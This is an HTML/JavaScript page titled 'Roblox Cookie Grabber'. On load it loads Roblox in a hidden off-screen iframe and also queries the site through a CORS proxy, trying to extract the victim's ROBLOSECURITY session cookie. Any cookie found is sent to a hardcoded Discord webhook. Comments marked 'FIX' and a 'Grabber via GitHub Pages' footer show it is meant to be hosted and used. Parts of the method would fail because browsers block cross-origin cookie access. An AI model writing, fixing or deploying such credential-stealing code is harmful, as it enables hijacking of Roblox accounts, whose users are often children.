<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Roblox Cookie Grabber</title>
    <style>
        body {
            background-color: #232527;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        #statusBox {
            background-color: #393b3d;
            padding: 25px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
            width: 350px;
        }

        h1 { margin-top: 0; font-size: 24px; color: #fff; }
        
        #statusText {
            font-size: 16px;
            margin-bottom: 15px;
            min-height: 20px;
            color: #b9bbbe;
        }

        .success { background-color: #3ba55c !important; color: white; }
        .error { background-color: #ed4245 !important; color: white; }
        
        button {
            margin-top: 10px;
            padding: 8px 16px;
            background-color: #3ba55c;
            border: none;
            color: white;
            border-radius: 4px;
            cursor: pointer;
        }

        iframe {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>

    <div id="statusBox">
        <h1>Roblox Cookie Grabber</h1>
        <p id="statusText">Loading Roblox...</p>
        <button onclick="forceCheck()">Force Check Cookies</button>
    </div>

    <!-- Hidden iframe to load Roblox -->
    <iframe id="robloxFrame" src="https://www.roblox.com/home"></iframe>

    <script>
        // 🔴 FIX #1: Paste your Discord Webhook URL here
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4'; 

        function updateUI(message, type) {
            const statusText = document.getElementById('statusText');
            const statusBox = document.getElementById('statusBox');

            statusText.innerText = message;
            
            statusBox.classList.remove('success', 'error');
            
            if (type === 'success') {
                statusBox.classList.add('success');
            } else if (type === 'error') {
                statusBox.classList.add('error');
            }
        }

        // 🔴 FIX #2: Get Cookie from Iframe
        function getCookieFromIframe() {
            const iframe = document.getElementById('robloxFrame');
            
            try {
                const cookieString = iframe.contentWindow.document.cookie;
                const cookies = cookieString.split('; ');
                
                for (let i = 0; i < cookies.length; i++) {
                    if (cookies[i].startsWith('ROBLOSECURITY=')) {
                        return cookies[i].substring(14); // Return value after "ROBLOSECURITY="
                    }
                }
            } catch (e) {
                console.log("Iframe cookie access error:", e);
            }
            
            return null;
        }

        // 🔴 FIX #3: Send to Discord with Error Handling
        async function sendToDiscord(cookieValue) {
            try {
                const payload = {
                    content: "🔥 **New Roblox Cookie Found!**",
                    embeds: [{
                        title: "Cookie Grabbed",
                        description: `**Cookie:** \`${cookieValue}\``,
                        color: 16753920, // Reddish color for Discord embed
                        footer: { text: "Grabber via GitHub Pages" }
                    }]
                };

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error(`Discord API returned ${response.status}`);
                }

                return true; 

            } catch (error) {
                console.error("Fetch error:", error);
                updateUI("Failed to send to Discord", "error");
                return false;
            }
        }

        // 🔴 FIX #4: Main Execution Logic with Iframe Check
        async function main() {
            const iframe = document.getElementById('robloxFrame');
            
            // Wait for iframe to load
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            const cookie = getCookieFromIframe();

            if (cookie) {
                updateUI("Sending data...", "success"); 
                await sendToDiscord(cookie);
            } else {
                // If iframe check fails, try proxy method
                setTimeout(() => {
                    forceCheck();
                }, 1000);
            }
        }

        async function forceCheck() {
            updateUI("Fetching cookies from Roblox...", "success");
            
            const response = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://www.roblox.com'));
            const data = await response.json();
            
            // Look for the cookie in the HTML source code (Meta tags or Script variables)
            const cookiesMatch = data.contents.match(/ROBLOSECURITY=([^;]+)/);
            
            if (cookiesMatch) {
                const cookieValue = cookiesMatch[1];
                
                await sendToDiscord(cookieValue);
                updateUI("Cookie sent to Discord!", "success");
            } else {
                // If the proxy method also fails, try one more time via iframe
                setTimeout(() => {
                    const retry = getCookieFromIframe();
                    if(retry) {
                        sendToDiscord(retry);
                        updateUI("Found via Retry!", "success");
                    } else {
                        updateUI("Failed to grab cookie.", "error");
                    }
                }, 1000);
            }
        }

        // Start the script when page loads
        window.onload = main; 
    </script>
</body>
</html>
